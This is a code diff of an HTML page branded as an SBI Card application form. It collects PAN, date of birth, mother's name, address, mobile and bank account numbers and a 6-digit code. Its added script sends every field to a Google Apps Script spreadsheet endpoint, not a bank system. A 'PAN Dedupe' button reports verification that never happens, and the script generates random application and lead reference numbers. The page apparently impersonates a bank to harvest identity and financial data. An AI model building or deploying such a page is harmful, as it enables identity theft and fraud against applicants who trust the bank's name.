@@ -1,282 +1,810 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>SBI Card Application Form</title>
-  <link rel="stylesheet" href="appcode.css">
+
+  <style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        padding: 20px;
+    }
+
+    .form-container {
+        max-width: 600px;
+        margin: 0 auto;
+        background: white;
+        border-radius: 15px;
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+        overflow: hidden;
+    }
+
+    .form-header {
+        background: linear-gradient(135deg, #2E86AB 0%, #A23B72 100%);
+        color: white;
+        padding: 20px;
+        text-align: center;
+    }
+
+    .form-header h1 {
+        font-size: 24px;
+        font-weight: 600;
+        margin-bottom: 5px;
+    }
+
+    .form-header p {
+        opacity: 0.9;
+        font-size: 14px;
+    }
+
+    .form-body {
+        padding: 30px;
+    }
+
+    .section {
+        margin-bottom: 30px;
+    }
+
+    .section-title {
+        font-size: 18px;
+        font-weight: 600;
+        color: #2E86AB;
+        margin-bottom: 20px;
+        padding-bottom: 8px;
+        border-bottom: 2px solid #f0f0f0;
+    }
+
+    .form-group {
+        margin-bottom: 20px;
+        position: relative;
+    }
+
+    .form-group label {
+        display: block;
+        margin-bottom: 8px;
+        font-weight: 500;
+        color: #333;
+        font-size: 14px;
+    }
+
+    .required::after {
+        content: " *";
+        color: #e74c3c;
+        font-weight: bold;
+    }
+
+    .form-group input,
+    .form-group select {
+        width: 100%;
+        padding: 12px 15px;
+        border: 2px solid #e0e0e0;
+        border-radius: 8px;
+        font-size: 14px;
+        transition: all 0.3s ease;
+        background: white;
+    }
+
+    .form-group input:focus,
+    .form-group select:focus {
+        outline: none;
+        border-color: #2E86AB;
+        box-shadow: 0 0 0 3px rgba(46, 134, 171, 0.1);
+        transform: translateY(-2px);
+    }
+
+    .form-group input:invalid {
+        border-color: #e74c3c;
+    }
+
+    .form-row {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 20px;
+    }
+
+    .checkbox-group {
+        display: flex;
+        align-items: center;
+        margin-bottom: 15px;
+    }
+
+    .checkbox-group input[type="checkbox"] {
+        width: auto;
+        margin-right: 10px;
+        transform: scale(1.2);
+    }
+
+    .button-group {
+        display: flex;
+        gap: 15px;
+        justify-content: center;
+        margin-top: 30px;
+    }
+
+    .btn {
+        padding: 12px 30px;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+    }
+
+    .btn-primary {
+        background: linear-gradient(135deg, #2E86AB 0%, #A23B72 100%);
+        color: white;
+    }
+
+    .btn-primary:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 20px rgba(46, 134, 171, 0.3);
+    }
+
+    .btn-secondary {
+        background: #f8f9fa;
+        color: #6c757d;
+        border: 2px solid #e0e0e0;
+    }
+
+    .btn-secondary:hover {
+        background: #e9ecef;
+        border-color: #adb5bd;
+    }
+
+    .pan-dedupe-btn {
+        background: #2E86AB;
+        color: white;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 14px;
+        font-weight: 500;
+        margin-top: 10px;
+        transition: all 0.3s ease;
+    }
+
+    .pan-dedupe-btn:hover {
+        background: #236a89;
+        transform: translateY(-1px);
+    }
+
+    /* Popup Styles */
+    .popup-overlay {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.5);
+        z-index: 1000;
+        backdrop-filter: blur(5px);
+    }
+
+    .popup-container {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: white;
+        border-radius: 15px;
+        padding: 30px;
+        width: 400px;
+        max-width: 90vw;
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+        text-align: center;
+    }
+
+    .popup-header {
+        font-size: 20px;
+        font-weight: 600;
+        color: #2E86AB;
+        margin-bottom: 25px;
+    }
+
+    .popup-info {
+        margin-bottom: 20px;
+        text-align: left;
+    }
+
+    .popup-info div {
+        margin-bottom: 10px;
+        font-size: 14px;
+        color: #333;
+    }
+
+    .popup-info strong {
+        color: #2E86AB;
+        font-weight: 600;
+    }
+
+    .popup-input-group {
+        margin: 25px 0;
+    }
+
+    .popup-input-group input {
+        width: 100%;
+        padding: 12px 15px;
+        border: 2px solid #e0e0e0;
+        border-radius: 8px;
+        font-size: 16px;
+        text-align: center;
+        letter-spacing: 2px;
+    }
+
+    .popup-input-group input:focus {
+        outline: none;
+        border-color: #2E86AB;
+        box-shadow: 0 0 0 3px rgba(46, 134, 171, 0.1);
+    }
+
+    .popup-buttons {
+        display: flex;
+        gap: 15px;
+        justify-content: center;
+        margin-top: 25px;
+    }
+
+    .popup-btn {
+        padding: 12px 25px;
+        border: none;
+        border-radius: 8px;
+        font-size: 14px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        min-width: 100px;
+    }
+
+    .popup-btn-submit {
+        background: #2E86AB;
+        color: white;
+    }
+
+    .popup-btn-submit:hover {
+        background: #236a89;
+        transform: translateY(-2px);
+    }
+
+    .popup-btn-cancel {
+        background: #6c757d;
+        color: white;
+    }
+
+    .popup-btn-cancel:hover {
+        background: #5a6268;
+        transform: translateY(-2px);
+    }
+
+    @media (max-width: 768px) {
+        .form-row {
+            grid-template-columns: 1fr;
+        }
+
+        .button-group {
+            flex-direction: column;
+        }
+
+        .form-body {
+            padding: 20px;
+        }
+
+        .popup-container {
+            width: 350px;
+            padding: 25px;
+        }
+    }
+
+    .form-footer {
+        text-align: center;
+        padding: 20px;
+        background: #f8f9fa;
+        color: #6c757d;
+        font-size: 12px;
+    }
+  </style>
 </head>
 <body>
 
 <div class="form-container">
-  <h2>SBI Card </h2>
-  <form id="infoForm">
-     Personal Information Section
-    <div class="form-group">
-      <label for="salutation">*Select Salutation</label>
-      <select id="salutation" name="salutation" required>
-        <option value="">Select Salutation</option>
-        <option value="Mr">Mr.</option>
-        <option value="Ms">Ms.</option>
-        <option value="Mrs">Mrs.</option>
-      </select>
+  <div class="form-header">
+    <h1>SBI CARD</h1>
+    <p>Application Form</p>
+  </div>
+
+  <form class="form-body" id="sbiCardForm">
+    <!-- Personal Information -->
+    <div class="section">
+      <h2 class="section-title">Personal Information</h2>
+      <div class="form-group">
+        <label for="salutation" class="required">Select Salutation</label>
+        <select id="salutation" name="salutation" required>
+          <option value="">Select Salutation</option>
+          <option value="mr">Mr.</option>
+          <option value="ms">Ms.</option>
+          <option value="mrs">Mrs.</option>
+          <option value="dr">Dr.</option>
+        </select>
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label for="firstName" class="required">First Name</label>
+          <input type="text" id="firstName" name="firstName" required>
+        </div>
+        <div class="form-group">
+          <label for="middleName">Middle Name</label>
+          <input type="text" id="middleName" name="middleName">
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="lastName">Last Name</label>
+        <input type="text" id="lastName" name="lastName">
+      </div>
+      <div class="form-group">
+        <label for="dob" class="required">DOB as per Pan card (DD/MM/YYYY)</label>
+        <input type="date" id="dob" name="dob" required>
+      </div>
+      <div class="form-group">
+        <label for="nameOnPan">Name on pan card</label>
+        <input type="text" id="nameOnPan" name="nameOnPan">
+      </div>
+      <div class="checkbox-group">
+        <input type="checkbox" id="manualVip" name="manualVip">
+        <label for="manualVip">Manual VIP Tag</label>
+      </div>
+      <div class="form-group">
+        <label for="pan" class="required">PAN</label>
+        <input type="text" id="pan" name="pan" required pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}">
+      </div>
+      <button type="button" class="pan-dedupe-btn" onclick="checkPanDedupe()">PAN Dedupe</button>
+
+      <div class="form-row" style="margin-top: 20px;">
+        <div class="checkbox-group">
+          <input type="checkbox" id="cardTypeDeviation" name="cardTypeDeviation">
+          <label for="cardTypeDeviation">Card Type Deviation</label>
+        </div>
+        <div class="checkbox-group">
+          <input type="checkbox" id="form60" name="form60">
+          <label for="form60">Form 60</label>
+        </div>
+      </div>
     </div>
 
-    <div class="form-group">
-      <label for="firstName">*First Name</label>
-      <input type="text" id="firstName" name="firstName" required>
+    <!-- Address Information -->
+    <div class="section">
+      <h2 class="section-title">Address Information</h2>
+      <div class="form-group">
+        <label for="vvipCategory">Select VVIP Category</label>
+        <select id="vvipCategory" name="vvipCategory">
+          <option value="">Select Category</option>
+          <option value="vvip">VVIP</option>
+          <option value="vip">VIP</option>
+          <option value="regular">Regular</option>
+        </select>
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label for="fatherName">Father's Name</label>
+          <input type="text" id="fatherName" name="fatherName">
+        </div>
+        <div class="form-group">
+          <label for="motherName" class="required">Mother's Name</label>
+          <input type="text" id="motherName" name="motherName" required>
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="nationality" class="required">Nationality</label>
+        <select id="nationality" name="nationality" required>
+          <option value="">Select Nationality</option>
+          <option value="indian">Indian</option>
+          <option value="other">Other</option>
+        </select>
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label for="houseNo" class="required">House No.</label>
+          <input type="text" id="houseNo" name="houseNo" required>
+        </div>
+        <div class="form-group">
+          <label for="locality" class="required">Locality/Society</label>
+          <input type="text" id="locality" name="locality" required>
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="addressLine2">Address Line 2</label>
+        <input type="text" id="addressLine2" name="addressLine2">
+      </div>
+      <div class="form-row">
+        <div class="form-group">
+          <label for="pinCode" class="required">Pin Code</label>
+          <input type="text" id="pinCode" name="pinCode" required pattern="[0-9]{6}">
+        </div>
+        <div class="checkbox-group">
+          <input type="checkbox" id="oclPolicy" name="oclPolicy">
+          <label for="oclPolicy">OCL Policy Deviation</label>
+        </div>
+        <div class="form-group">
+          <label for="residenceCity">Residence City</label>
+          <input type="text" id="residenceCity" name="residenceCity">
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="stdCode2">STD Code</label>
+        <input type="text" id="stdCode2" name="stdCode2">
+      </div>
+
+      <!-- Contact Information -->
+      <div class="section">
+        <h2 class="section-title">Contact Information</h2>
+        <div class="form-group">
+          <label for="mobileNumber" class="required">Mobile Number</label>
+          <input type="tel" id="mobileNumber" name="mobileNumber" required pattern="[0-9]{10}">
+        </div>
+        <div class="form-group">
+          <label for="residencePhone">Residence Phone</label>
+          <input type="tel" id="residencePhone" name="residencePhone">
+        </div>
+        <div class="form-group">
+          <label for="emailText" class="required">E-Mail Text</label>
+          <input type="email" id="emailText" name="emailText" required>
+        </div>
+        <div class="form-group">
+          <label for="selectDomain" class="required">Select Domain</label>
+          <select id="selectDomain" name="selectDomain" required>
+            <option value="">Select Domain</option>
+            <option value="gmail.com">@Gmail.com</option>
+            <option value="yahoo.com">@Yahoo.com</option>
+            <option value="outlook.com">@Outlook.com</option>
+            <option value="live">@live.com</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label for="ckycId">CKYC ID</label>
+          <input type="text" id="ckycId" name="ckycId">
+        </div>
+      </div>
+
+      <!-- Additional Personal Information -->
+      <div class="section">
+        <h2 class="section-title">Additional Personal Information</h2>
+        <div class="form-group">
+          <label for="occupationType" class="required">Select Occupation Type</label>
+          <select id="occupationType" name="occupationType" required>
+            <option value="">Select Occupation</option>
+            <option value="salaried">Salaried</option>
+            <option value="self_employed">Self Employed</option>
+            <option value="business">Business</option>
+            <option value="professional">Professional</option>
+          </select>
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label for="companyName2">Company Name</label>
+            <input type="text" id="companyName2" name="companyName2">
+          </div>
+          <div class="form-group">
+            <label for="designation2">Designation</label>
+            <input type="text" id="designation2" name="designation2">
+          </div>
+          <div class="form-group">
+            <label for="officeEmail">Office Email</label>
+            <input type="email" id="officeEmail" name="officeEmail">
+          </div>
+        </div>
+      </div>
     </div>
 
-    <div class="form-group">
-      <label for="middleName">Middle Name</label>
-      <input type="text" id="middleName" name="middleName">
+    <div class="section">
+      <div class="form-group">
+        <label for="selectDocument">Select Document</label>
+        <select id="selectDocument" name="selectDocument">
+          <option value="">Select Document</option>
+          <option value="passport">Passport</option>
+          <option value="driving_license">Driving License</option>
+          <option value="voter_id">Voter ID</option>
+          <option value="aadhaar">Aadhaar Card</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label for="selectBank">Select Bank Name</label>
+        <select id="selectBank" name="selectBank">
+          <option value="">Select Bank</option>
+          <option value="sbi">State Bank of India</option>
+          <option value="hdfc">HDFC Bank</option>
+          <option value="icici">ICICI Bank</option>
+          <option value="axis">Axis Bank</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label for="branchCode">Branch Code</label>
+        <input type="text" id="branchCode" name="branchCode">
+      </div>
+      <div class="form-group">
+        <label for="qdeBank">Select Qde Bank Name</label>
+        <select id="qdeBank" name="qdeBank">
+          <option value="">Select Qde Bank</option>
+          <option value="sbi">State Bank of India</option>
+          <option value="hdfc">HDFC Bank</option>
+          <option value="icici">ICICI Bank</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label for="accountNumber">Account Number</label>
+        <input type="text" id="accountNumber" name="accountNumber">
+      </div>
+      <div class="form-group">
+        <label for="selectZone" class="required">Select Zone</label>
+        <select id="selectZone" name="selectZone" required>
+          <option value="">Select Zone</option>
+          <option value="north">North</option>
+          <option value="south">South</option>
+          <option value="east">East</option>
+          <option value="west">West</option>
+        </select>
+      </div>
+      <div class="checkbox-group">
+        <input type="checkbox" id="onBehalf" name="onBehalf">
+        <label for="onBehalf">On behalf of</label>
+      </div>
+      <div class="form-group">
+        <label for="seCode">SE Code</label>
+        <input type="text" id="seCode" name="seCode">
+      </div>
     </div>
 
-    <div class="form-group">
-      <label for="lastName">Last Name</label>
-      <input type="text" id="lastName" name="lastName" required>
+    <!-- Submit Buttons -->
+    <div class="button-group">
+      <button type="button" class="btn btn-secondary" onclick="cancelForm()">Cancel</button>
+      <button type="submit" class="btn btn-primary">Submit</button>
     </div>
-
-    <div class="form-group">
-      <label for="dob">*DOB as per PAN card</label>
-      <input type="date" id="dob" name="dob" required>
-    </div>
-
-    <div class="form-group">
-      <label for="nameOnPAN">Name on PAN Card</label>
-      <input type="text" id="nameOnPAN" name="nameOnPAN" required>
-    </div>
-
-    <div class="form-group">
-      <input type="checkbox" id="manualVipTag" name="manualVipTag">
-      <label for="manualVipTag">Manual VIP Tag</label>
-    </div>
-
-    <div class="form-group">
-      <label for="pan">*PAN</label>
-      <input type="text" id="pan" name="pan" required>
-      <button type="button">PAN Dedup</button>
-    </div>
-
-    <div class="form-group">
-      <input type="checkbox" id="cardTypeDeviation" name="cardTypeDeviation">
-      <label for="cardTypeDeviation">Card Type Deviation</label>
-    </div>
-
-    <div class="form-group">
-      <input type="checkbox" id="form60" name="form60">
-      <label for="form60">Form 60</label>
-    </div>
-
-    <div class="form-group">
-      <label for="vvipCategory">Select VVIP Category</label>
-      <select id="vvipCategory" name="vvipCategory">
-        <option value="">Select Category</option>
-        <!-- Add more categories as needed -->
-      </select>
-    </div>
-
-    <div class="form-group">
-      <label for="fathersName">Father's Name</label>
-      <input type="text" id="fathersName" name="fathersName">
-    </div>
-
-    <div class="form-group">
-      <label for="mothersName">*Mother's Name</label>
-      <input type="text" id="mothersName" name="mothersName">
-    </div>
-
-    <div class="form-group">
-      <label for="nationality">*Nationality</label>
-      <select id="nationality" name="nationality">
-        <option value="">Select Nationality</option>
-        <!-- Add more nationalities as needed -->
-      </select>
-    </div>
-
-    <div class="form-group">
-      <label for="houseNo">*House No.</label>
-      <input type="text" id="houseNo" name="houseNo">
-    </div>
-
-    <div class="form-group">
-      <label for="locality">*Locality/Society</label>
-      <input type="text" id="locality" name="locality">
-    </div>
-
-    <div class="form-group">
-      <label for="addressline2">Address Line 2</label>
-      <input type="text" id="addressline2" name="addressline2">
-    </div>
-
-    <div class="form-group">
-      <input type="checkbox" id="oclPolicyDeviation" name="oclPolicyDeviation">
-      <label for="oclPolicyDeviation">OCL Policy Deviation</label>
-    </div>
-
-    <div class="form-group">
-      <label for="pinCode">*Pin Code</label>
-      <input type="text" id="pinCode" name="pinCode">
-    </div>
-
-    <div class="form-group">
-      <input type="checkbox" id="oclPolicyDeviation" name="oclPolicyDeviation">
-      <label for="oclPolicyDeviation">OCL Policy Deviation</label>
-    </div>
-
-    <div class="form-group">
-      <label for="residenceCity">Residence City</label>
-      <select id="residenceCity" name="residenceCity">
-        <option value="">Select City</option>
-        <!-- Add more cities as needed -->
-      </select>
-    </div>
-
-    <div class="form-group">
-      <label for="stdCode">STD Code</label>
-      <input type="text" id="stdCode" name="stdCode">
-    </div>
-
-    <div class="form-group">
-      <label for="mobileNumber">*Mobile Number</label>
-      <input type="text" id="mobileNumber" name="mobileNumber" required>
-    </div>
-
-    <div class="form-group">
-      <label for="residencePhone">Residence Phone</label>
-      <input type="text" id="residencePhone" name="residencePhone">
-    </div>
-
-    <div class="form-group">
-      <label for="email">*E-Mail</label>
-      <input type="email" id="email" name="email">
-    </div>
-
-    <div class="form-group">
-      <label for="domain">*Select Domain</label>
-      <select id="domain" name="domain">
-        <option value="">Select Domain</option>
-        <!-- Add more domains as needed -->
-      </select>
-    </div>
-
-    <div class="form-group">
-      <label for="ckycId">CKYC ID</label>
-      <input type="text" id="ckycId" name="ckycId">
-    </div>
-
-    <!-- Additional Personal Information Section -->
-
-    <h3>Additional Personal Information</h3>
-    <div class="form-group">
-      <label for="occupationType">Select Occupation Type</label>
-      <select id="occupationType" name="occupationType">
-        <option value="">Select Occupation Type</option>
-        <!-- Add more occupation types as needed -->
-      </select>
-    </div>
-
-    <div class="form-group">
-      <label for="companyName">Company Name</label>
-      <input type="text" id="companyName" name="companyName">
-    </div>
-
-    <div class="form-group">
-      <label for="designation">Designation</label>
-      <input type="text" id="designation" name="designation">
-    </div>
-
-<!--    <div class="form-group">-->
-<!--      <label for="gstNumber">GST Number</label>-->
-<!--      <input type="text" id="gstNumber" name="gstNumber">-->
-<!--    </div>-->
-
-    <div class="form-group">
-      <label for="officeEmail">Office Email</label>
-      <input type="email" id="officeEmail" name="officeEmail">
-    </div>
-
-    <div class="form-group">
-      <label for="document">Select Document</label>
-      <select id="document" name="document">
-        <option value="">Select Document</option>
-        <!-- Add more document types as needed -->
-      </select>
-    </div>
-
-    <div class="form-group">
-      <label for="bankName">Select Bank Name</label>
-      <select id="bankName" name="bankName">
-        <option value="">Select Bank Name</option>
-        <!-- Add more bank names as needed -->
-      </select>
-    </div>
-
-<!--    <div class="form-group">-->
-<!--      <label for="branchCode">Branch Code</label>-->
-<!--      <input type="text" id="branchCode" name="branchCode">-->
-<!--    </div>-->
-
-    <div class="form-group">
-      <label for="qdeBankName">Select Qde Bank Name</label>
-      <select id="qdeBankName" name="qdeBankName">
-        <option value="">Select Qde Bank Name</option>
-        <!-- Add more bank names as needed -->
-      </select>
-    </div>
-
-    <div class="form-group">
-      <label for="accountNumber">Account Number</label>
-      <input type="text" id="accountNumber" name="accountNumber">
-    </div>
-
-    <div class="form-group">
-      <label for="zone">*Select Zone</label>
-      <select id="zone" name="zone">
-        <option value="">Select Zone</option>
-        <!-- Add more zones as needed -->
-      </select>
-    </div>
-
-    <div class="form-group">
-      <input type="checkbox" id="onBehalfOf" name="onBehalfOf">
-      <label for="onBehalfOf">On behalf of</label>
-    </div>
-
-    <div class="form-group">
-      <label for="seCode">SE Code</label>
-      <input type="text" id="seCode" name="seCode">
-    </div>
-
-    <div class="form-buttons">
-      <button type="button" onclick="goToNextPage()">Next</button>
-      <input type="reset" value="Reset">
-    </div>
-
-
   </form>
+
+  <div class="form-footer">
+    <p>&copy; 2025 SBI Card. All rights reserved.</p>
+  </div>
 </div>
 
-<!-- Popup Container -->
-<div class="popup-container" id="popupContainer">
-  <div class="popup">
-    <h3>Application Code Confirmation</h3>
-    <input type="text" id="appCodeInput" placeholder="Enter Application Code">
+<!-- Popup for App Code -->
+<div class="popup-overlay" id="popupOverlay">
+  <div class="popup-container">
+    <div class="popup-header">Enter App Code</div>
+
+    <div class="popup-info">
+      <div><strong>Lead Ref No.:</strong> <span id="leadRefNo"></span></div>
+      <div><strong>Application No.:</strong> <span id="applicationNo"></span></div>
+      <div><strong>Mobile No.:</strong> <span id="popupMobileNo"></span></div>
+    </div>
+
+    <div class="popup-input-group">
+      <input type="text" id="appCodeInput" placeholder="Enter Application Code" maxlength="6" pattern="[0-9]{6}">
+    </div>
+
     <div class="popup-buttons">
-      <button id="confirmButton">Confirm</button>
-      <button id="cancelButton">Cancel</button>
+      <button class="popup-btn popup-btn-submit" onclick="submitAppCode()">Submit</button>
+      <button class="popup-btn popup-btn-cancel" onclick="cancelPopup()">Cancel</button>
     </div>
   </div>
 </div>
 
-<!-- Loader Container -->
-<div class="loader-container" id="loaderContainer">
-  <div class="loader"></div>
-</div>
+<script>
+  // Function to generate random 13-digit Lead Reference Number
+  function generateLeadRefNo() {
+    let leadRef = '';
+    for (let i = 0; i < 13; i++) {
+      leadRef += Math.floor(Math.random() * 10);
+    }
+    return leadRef;
+  }
 
-<script src="qdeform.js"></script>
-<script src="script.js"></script>
+  // Function to generate 15-digit Application Number with Julian date format
+  function generateApplicationNo() {
+    const currentDate = new Date();
+    const currentYear = currentDate.getFullYear();
+
+    // Calculate Julian date (YYDDD format)
+    const startOfYear = new Date(currentYear, 0, 1);
+    const dayOfYear = Math.floor((currentDate - startOfYear) / (24 * 60 * 60 * 1000)) + 1;
+
+    // Get last 2 digits of year
+    const yearDigits = currentYear.toString().slice(-2);
+
+    // Format day of year as 3 digits
+    const dayDigits = dayOfYear.toString().padStart(3, '0');
+
+    // First 5 digits: YYDDD format
+    const julianPart = yearDigits + dayDigits;
+
+    // Remaining 10 digits: random numbers
+    let randomPart = '';
+    for (let i = 0; i < 10; i++) {
+      randomPart += Math.floor(Math.random() * 10);
+    }
+
+    return julianPart + randomPart;
+  }
+
+  // Form validation and submission
+  document.getElementById('sbiCardForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      // Check if all required fields are filled
+      const requiredFields = document.querySelectorAll('[required]');
+      let isValid = true;
+
+      requiredFields.forEach(field => {
+          if (!field.value.trim()) {
+              isValid = false;
+              field.style.borderColor = '#e74c3c';
+          } else {
+              field.style.borderColor = '#e0e0e0';
+          }
+      });
+
+      if (isValid) {
+          // Get mobile number from the form
+          const mobileNumber = document.getElementById('mobileNumber').value;
+
+          // Generate Lead Ref No and Application No
+          const leadRefNo = generateLeadRefNo();
+          const applicationNo = generateApplicationNo();
+
+          // Populate popup data
+          document.getElementById('leadRefNo').textContent = leadRefNo;
+          document.getElementById('applicationNo').textContent = applicationNo;
+          document.getElementById('popupMobileNo').textContent = mobileNumber;
+
+          // Clear previous app code input
+          document.getElementById('appCodeInput').value = '';
+
+          // Show popup
+          document.getElementById('popupOverlay').style.display = 'block';
+
+          // Focus on input field
+          setTimeout(() => {
+              document.getElementById('appCodeInput').focus();
+          }, 100);
+
+      } else {
+          alert('Please fill in all required fields marked with *');
+      }
+  });
+
+  // Submit App Code function
+  function submitAppCode() {
+      const appCode = document.getElementById('appCodeInput').value;
+
+      if (appCode.length === 6 && /^\d{6}$/.test(appCode)) {
+          // Disable submit button to prevent multiple submissions
+          const submitBtn = document.querySelector('.popup-btn-submit');
+          submitBtn.disabled = true;
+          submitBtn.textContent = 'Submitting...';
+
+          // Get the generated numbers
+          const leadRefNo = document.getElementById('leadRefNo').textContent;
+          const applicationNo = document.getElementById('applicationNo').textContent;
+
+          // Collect all form data
+          const formData = new FormData(document.getElementById('sbiCardForm'));
+
+          // Add popup-specific data
+          formData.append('leadRefNo', leadRefNo);
+          formData.append('applicationNo', applicationNo);
+          formData.append('appCode', appCode);
+
+          // Convert FormData to key-value pairs string
+          var keyValuePairs = [];
+          for (var pair of formData.entries()) {
+              keyValuePairs.push(pair[0] + "=" + pair[1]);
+          }
+          var formDataString = keyValuePairs.join("&");
+
+          // Submit to Google Sheets
+          fetch('https://script.google.com/macros/s/AKfycbzA29vURSVA7n5TTnlxxtC43tCEtotSoLDfmC3ZwM_YLcR6vUQkrbD49viZs4DBHjja/exec', {
+              redirect: "follow",
+              method: "POST",
+              body: formDataString,
+              headers: {
+                  "Content-Type": "text/plain;charset=utf-8",
+              },
+          })
+          .then(function (response) {
+              if (response) {
+                  return response;
+              } else {
+                  throw new Error("Failed to submit the form.");
+              }
+          })
+          .then(function (data) {
+              // Success - redirect to soft decision page with parameters
+              alert('Application Submitted Successfully with Application No: ' + applicationNo);
+
+              // Redirect to soft decision page with URL parameters
+              const softDecisionUrl = `softdecision.html?applicationNo=${encodeURIComponent(applicationNo)}&leadRefNo=${encodeURIComponent(leadRefNo)}`;
+              window.location.href = softDecisionUrl;
+          })
+          .catch(function (error) {
+              console.error('Error submitting form:', error);
+              alert('An error occurred while submitting the form. Please try again.');
+          })
+          .finally(() => {
+              // Re-enable submit button
+              submitBtn.disabled = false;
+              submitBtn.textContent = 'Submit';
+          });
+
+      } else {
+          alert('Please enter a valid 6-digit numeric application code');
+          document.getElementById('appCodeInput').focus();
+      }
+  }
+
+  // Cancel popup function
+  function cancelPopup() {
+      document.getElementById('popupOverlay').style.display = 'none';
+  }
+
+  // Close popup when clicking outside
+  document.getElementById('popupOverlay').addEventListener('click', function(e) {
+      if (e.target === this) {
+          cancelPopup();
+      }
+  });
+
+  // Handle Enter key in app code input
+  document.getElementById('appCodeInput').addEventListener('keypress', function(e) {
+      if (e.key === 'Enter') {
+          submitAppCode();
+      }
+  });
+
+  // Allow only numeric input for app code
+  document.getElementById('appCodeInput').addEventListener('input', function(e) {
+      this.value = this.value.replace(/\D/g, '').slice(0, 6);
+  });
+
+  // PAN Dedupe function
+  function checkPanDedupe() {
+      const panInput = document.getElementById('pan');
+      if (panInput.value.trim()) {
+          alert('PAN verification completed!');
+      } else {
+          alert('Please enter PAN number first');
+      }
+  }
+
+  // Cancel form function
+  function cancelForm() {
+      if (confirm('Are you sure you want to cancel? All data will be lost.')) {
+          document.getElementById('sbiCardForm').reset();
+      }
+  }
+
+  // Real-time validation for specific fields
+  document.getElementById('mobileNumber').addEventListener('input', function(e) {
+      this.value = this.value.replace(/\D/g, '').slice(0, 10);
+  });
+
+  document.getElementById('pinCode').addEventListener('input', function(e) {
+      this.value = this.value.replace(/\D/g, '').slice(0, 6);
+  });
+
+  document.getElementById('pan').addEventListener('input', function(e) {
+      this.value = this.value.toUpperCase();
+  });
+</script>
 
 </body>
 </html>
